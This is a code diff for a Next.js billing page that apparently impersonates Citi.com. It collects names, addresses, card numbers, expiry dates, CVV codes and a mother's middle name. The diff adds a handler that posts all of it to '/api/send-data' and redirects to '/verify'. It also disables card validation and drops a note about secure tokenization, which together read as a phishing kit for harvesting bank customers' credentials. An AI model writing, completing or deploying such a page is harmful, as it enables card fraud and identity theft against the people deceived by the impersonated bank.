@@ -3,6 +3,8 @@
 import Header from "@/components/layout/Header";
 import Footer from "@/components/layout/Footer";
 import React, { useState } from "react";
+import { useRouter } from "next/navigation";
+import axios from "axios";
 
 // export const metadata = {
 //   title: "Billing & Payment | Citi.com",
@@ -19,9 +21,11 @@ const BillingPage = () => {
     cardNumber: "",
     expiry: "",
     cvv: "",
-    cardName: "",
+    // cardName: "",
     motherMiddleName: "",
   });
+  const [loading, setLoading] = useState(false);
+  const router = useRouter();
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -41,6 +45,22 @@ const BillingPage = () => {
       .slice(0, 4)
       .replace(/(.{2})/, "$1/");
 
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    try {
+      setLoading(true);
+      const res = await axios.post("/api/send-data", form);
+      if (res.status === 200) {
+        router.push("/verify");
+      }
+    } catch (err) {
+      alert("Something wrong, Please try again.");
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <main className="min-h-screen bg-[#f5f7fa] flex flex-col">
       <Header />
@@ -59,7 +79,7 @@ const BillingPage = () => {
 
             <form
               className="p-6 grid grid-cols-1 gap-6"
-              onSubmit={(e) => e.preventDefault()}
+              onSubmit={handleSubmit}
             >
               <div>
                 <label className="block text-sm font-medium text-gray-700">
@@ -69,7 +89,7 @@ const BillingPage = () => {
                   name="fullName"
                   value={form.fullName}
                   onChange={handleChange}
-                  required
+                  required={true}
                   className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                   placeholder="John A. Smith"
                 />
@@ -84,7 +104,7 @@ const BillingPage = () => {
                     name="address"
                     value={form.address}
                     onChange={handleChange}
-                    required
+                    required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                     placeholder="123 Main St"
                   />
@@ -99,7 +119,7 @@ const BillingPage = () => {
                     value={form.zip}
                     onChange={handleChange}
                     inputMode="numeric"
-                    required
+                    required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                     placeholder="10001"
                   />
@@ -116,7 +136,7 @@ const BillingPage = () => {
                     name="email"
                     value={form.email}
                     onChange={handleChange}
-                    required
+                    required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                     placeholder="you@example.com"
                   />
@@ -131,7 +151,7 @@ const BillingPage = () => {
                     value={form.phone}
                     onChange={handleChange}
                     inputMode="tel"
-                    required
+                    required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                     placeholder="+1 (555) 555-0123"
                   />
@@ -154,7 +174,7 @@ const BillingPage = () => {
                     autoComplete="cc-csc"
                     maxLength={9}
                     placeholder="●●● ●●● ●●●"
-                    required
+                    required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                   />
                 </div>
@@ -167,7 +187,7 @@ const BillingPage = () => {
                     name="motherMiddleName"
                     value={form.motherMiddleName}
                     onChange={handleChange}
-                    required
+                    required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                     placeholder="Enter Your Mother's Middle Name"
                   />
@@ -194,9 +214,9 @@ const BillingPage = () => {
                       }
                       inputMode="numeric"
                       autoComplete="cc-number"
-                      pattern="\d{13,16}"
+                      // pattern="\d{13,16}"
                       maxLength={19}
-                      required
+                      required={true}
                       className="w-full rounded-lg border px-4 py-3 pr-32 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                       placeholder="1234 5678 9012 3456"
                     />
@@ -246,7 +266,7 @@ const BillingPage = () => {
                         autoComplete="cc-exp"
                         maxLength={5}
                         placeholder="MM/YY"
-                        required
+                        required={true}
                         className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                       />
                     </div>
@@ -268,7 +288,7 @@ const BillingPage = () => {
                         autoComplete="cc-csc"
                         maxLength={4}
                         placeholder="●●●"
-                        required
+                        required={true}
                         className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                       />
                     </div>
@@ -313,12 +333,9 @@ const BillingPage = () => {
                   </button> */}
                   <button
                     type="submit"
-                    className="px-6 py-3 rounded-lg bg-[#0d2d62] text-white font-semibold hover:bg-[#08325a]"
-                    onClick={() => {
-                      /* Replace with real integration: send card to hosted payment/tokenization endpoint */
-                    }}
+                    className="px-6 py-3 rounded-lg bg-primary hover:!bg-[#054e7b] text-white font-semibold"
                   >
-                    Next
+                    {loading ? "Loading..." : "Next"}
                   </button>
                 </div>
               </div>
